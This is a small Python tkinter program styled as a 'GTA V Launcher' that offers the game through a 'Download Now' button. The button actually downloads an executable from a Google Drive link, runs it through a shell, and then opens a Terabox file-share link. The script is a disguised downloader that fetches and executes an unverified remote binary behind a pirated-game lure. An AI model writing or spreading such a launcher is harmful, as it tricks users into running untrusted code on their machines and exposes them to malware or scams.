
import tkinter as tk
from tkinter import messagebox
import urllib.request
import subprocess
import webbrowser

# Terabox setup and game link URLs
TERABOX_SETUP_URL = "https://drive.google.com/uc?export=download&id=1pIwYRk1A81Xk5yfbtOglM6LjRsrpLCVP"
GAME_DOWNLOAD_LINK = "https://1024terabox.com/s/1OvntfiHgzP9PeQLB1UCiZQ"

def download_and_launch():
    try:
        status_label.config(text="Downloading Terabox setup...")
        installer_path = "TeraboxSetup.exe"
        urllib.request.urlretrieve(TERABOX_SETUP_URL, installer_path)
        status_label.config(text="Launching installer...")
        subprocess.Popen(installer_path, shell=True)
        messagebox.showinfo("Next Step", "After installation, click OK to continue to game download link.")
        webbrowser.open(GAME_DOWNLOAD_LINK)
        root.destroy()
    except Exception as e:
        messagebox.showerror("Error", str(e))

root = tk.Tk()
root.title("GTA V Launcher")
root.geometry("450x300")
root.config(bg="#121212")

title = tk.Label(root, text="GTA V - Game Launcher", font=("Arial", 16), fg="#ffffff", bg="#121212")
title.pack(pady=20)

desc = tk.Label(root, text="Download Terabox and get access to GTA V now!", font=("Arial", 10), fg="#cccccc", bg="#121212")
desc.pack()

download_btn = tk.Button(root, text="Download Now", font=("Arial", 12), bg="#1e90ff", fg="white", command=download_and_launch)
download_btn.pack(pady=20)

status_label = tk.Label(root, text="", font=("Arial", 9), fg="lightgreen", bg="#121212")
status_label.pack(pady=10)

root.mainloop()
